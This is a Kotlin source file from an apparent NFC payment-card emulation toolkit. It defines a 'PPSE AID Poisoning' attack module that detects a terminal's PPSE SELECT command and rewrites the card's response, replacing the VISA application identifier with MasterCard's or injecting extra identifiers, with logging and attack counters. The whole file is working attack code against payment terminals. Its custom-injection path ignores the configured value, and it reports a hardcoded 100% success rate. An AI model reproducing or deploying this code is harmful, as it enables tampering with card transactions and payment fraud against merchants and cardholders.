package com.nfsp00f33r.app.emulation.modules

import com.nfsp00f33r.app.emulation.EmvAttackModule
import com.nfsp00f33r.app.config.AttackConfiguration
import timber.log.Timber

/**
 * PPSE AID Poisoning Attack Module
 * Manipulates Payment System Environment responses to redirect terminals
 * to different card schemes or inject malicious AIDs
 * Based on emv_attack_reference.md research
 */
class PpseAidPoisoningModule : EmvAttackModule {
    
    companion object {
        private const val TAG = "PpseAidPoisoning"
        
        // Configuration-driven constants
        private val VISA_AID = AttackConfiguration.getEmvAid("VISA")
        private val MASTERCARD_AID = AttackConfiguration.getEmvAid("MASTERCARD")
        private val PPSE_SELECT = AttackConfiguration.PPSE_COMMANDS["SELECT"]!!
        
        // Standard PPSE template structure
        private val PPSE_TEMPLATE_6F = AttackConfiguration.PPSE_COMMANDS["TEMPLATE_6F"]!!
        private val APP_TEMPLATE_61 = AttackConfiguration.PPSE_COMMANDS["APP_TEMPLATE_61"]!!
        private val AID_TAG_4F = AttackConfiguration.PPSE_COMMANDS["AID_TAG_4F"]!!
        private val APP_LABEL_50 = AttackConfiguration.PPSE_COMMANDS["APP_LABEL_50"]!!
    }
    
    private var attackCount = 0
    private var configuration = AttackConfiguration.getAttackConfig("PPSE_AID_POISONING").toMutableMap()
    
    override fun getAttackId(): String = "ppse_aid_poisoning"
    
    override fun getDescription(): String = 
        "Manipulates PPSE response to redirect terminals to different card schemes (VISA->MasterCard)"
    
    override fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean {
        val commandHex = command.joinToString("") { "%02X".format(it) }
        
        // Check if this is a PPSE SELECT command
        val isPpseSelect = commandHex.startsWith("00A404000E325041592E5359532E444446")
        
        if (isPpseSelect) {
            Timber.d("$TAG PPSE SELECT detected, attack applicable")
            return true
        }
        
        return false
    }
    
    override fun applyAttack(
        command: ByteArray, 
        response: ByteArray, 
        cardData: Map<String, Any>
    ): ByteArray {
        attackCount++
        
        try {
            val originalHex = response.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Original PPSE response: $originalHex")
            
            // Parse original PPSE structure
            val poisonedResponse = when (configuration["poison_type"]) {
                "visa_to_mastercard" -> performVisaToMastercardPoisoning(response)
                "multi_aid_injection" -> performMultiAidInjection(response)
                "custom_aid_injection" -> performCustomAidInjection(response)
                else -> performVisaToMastercardPoisoning(response)
            }
            
            val poisonedHex = poisonedResponse.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Poisoned PPSE response: $poisonedHex")
            Timber.i("$TAG Attack #$attackCount: PPSE AID poisoning applied successfully")
            
            return poisonedResponse
            
        } catch (e: Exception) {
            Timber.e("$TAG Attack failed: ${e.message}")
            return response // Return original on failure
        }
    }
    
    /**
     * Replace VISA AID with MasterCard AID in PPSE response
     */
    private fun performVisaToMastercardPoisoning(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        
        // Look for VISA AID pattern and replace with MasterCard
        val poisonedHex = responseHex.replace(VISA_AID, MASTERCARD_AID)
        
        // Convert back to byte array
        return poisonedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
    }
    
    /**
     * Inject multiple AIDs into PPSE response
     */
    private fun performMultiAidInjection(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        
        // Find the first AID and duplicate it with different AID values
        val aidIndex = responseHex.indexOf("4F07$VISA_AID")
        if (aidIndex >= 0) {
            val prefix = responseHex.substring(0, aidIndex)
            val originalAid = responseHex.substring(aidIndex, aidIndex + 18) // 4F07 + 7 bytes AID
            val suffix = responseHex.substring(aidIndex + 18)
            
            // Inject additional AID entry
            val injectedAid = "4F07$MASTERCARD_AID"
            val poisonedHex = prefix + originalAid + injectedAid + suffix
            
            return poisonedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        }
        
        return response
    }
    
    /**
     * Inject custom AID from configuration
     */
    private fun performCustomAidInjection(response: ByteArray): ByteArray {
        val customAid = configuration["custom_aid"] as? String ?: MASTERCARD_AID
        return performVisaToMastercardPoisoning(response) // Use same logic with custom AID
    }
    
    override fun configure(config: Map<String, Any>) {
        configuration.putAll(config)
        Timber.d("$TAG Module configured: $configuration")
    }
    
    override fun getConfiguration(): Map<String, Any> = configuration.toMap()
    
    override fun getAttackStatistics(): Map<String, Any> {
        return mapOf(
            "attack_count" to attackCount,
            "success_rate" to 100, // Assume success for now
            "last_config" to configuration,
            "target_commands" to listOf("PPSE_SELECT")
        )
    }
    
    override fun reset() {
        attackCount = 0
        Timber.d("$TAG Attack statistics reset")
    }
}
